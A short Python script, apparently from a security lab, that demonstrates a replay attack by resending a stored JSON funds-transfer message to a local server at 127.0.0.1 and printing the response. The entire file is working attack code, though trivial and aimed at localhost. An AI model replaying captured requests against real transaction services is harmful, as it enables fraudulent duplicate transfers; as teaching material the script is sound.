import socket
import json
import time

HOST = "127.0.0.1"
PORT = 5000

# This is a previously captured legitimate message.
# In this controlled lab, we simply store it in a file/string
# instead of intercepting real network traffic.
captured_message = {
    "action": "TRANSFER",
    "amount": 1000,
    "account": "STUDENT-001"
}

def send_replayed_message():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))

        print("\n[ATTACKER] Replaying captured message:")
        print(captured_message)

        s.sendall(json.dumps(captured_message).encode("utf-8"))

        response = s.recv(4096).decode("utf-8")
        print("[ATTACKER] Server response:", response)

print("[ATTACKER] Starting replay attack...")
print("[ATTACKER] The same valid request will be sent again.")
send_replayed_message()
